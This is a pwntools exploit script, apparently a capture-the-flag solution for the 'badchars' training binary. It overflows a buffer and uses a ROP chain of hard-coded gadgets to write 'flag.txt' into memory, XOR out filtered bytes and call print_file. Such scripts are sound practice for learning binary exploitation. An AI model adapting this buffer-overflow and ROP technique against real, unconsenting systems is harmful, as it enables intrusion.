#!/usr/bin/python3

#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *


local_file  = './badchars'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

elf.checksec()

# info
#4   0x00400510 GLOBAL FUNC       print_file
printfile=p64(0x00400510)

#debug('b main')


popret=p64(0x40069c)
movret=p64(0x400634)
xorret=p64(0x400628)
popxor=p64(0x4006a0)
poprdi=p64(0x4006a3)
addret=p64(0x40062c)
#0x0000000000400634 : mov qword ptr [r13], r12 ; ret
#
#0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
#
#0x00000000004006a0 : pop r14 ; pop r15 ; ret
#
#0x0000000000400628 : xor byte ptr [r15], r14b ; ret
#
#0x00000000004006a3 : pop rdi ; ret
#
#0x000000000040062c : add byte ptr [r15], r14b ; ret


#print_file参数是一个地址，所以不能用字符串传入
#args
#23  0x00001028   0x10 0x00601028   0x10 -rw- .data
dataaddress=p64(0x00601028)
data=b'flag.txt'

# rop1s
gadget=popret+data + dataaddress+b'a'*16+movret
#gadget+=popebx+p32(0x8a8a8a8a)+xorret
gadget+=popxor+p64(0x8a)+p64(0x00601028+0x2)+xorret  #8a 00 00 00
gadget+=popxor+p64(0x8c)+p64(0x00601028+0x3)+xorret  #8a 00 00 00
gadget+=popxor+p64(0xc5)+p64(0x00601028+0x4)+xorret  #8a 00 00 00
gadget+=popxor+p64(0x93)+p64(0x00601028+0x6)+xorret  #8a 00 00 00


gadget+=poprdi+dataaddress+ printfile
offset = 40
payload = b'A'*offset
#elf.p8(elf.bss()+0x100,data)
payload += gadget

# debug()
sl(payload)
p.interactive()



#system()地址 + 命令字符串地址
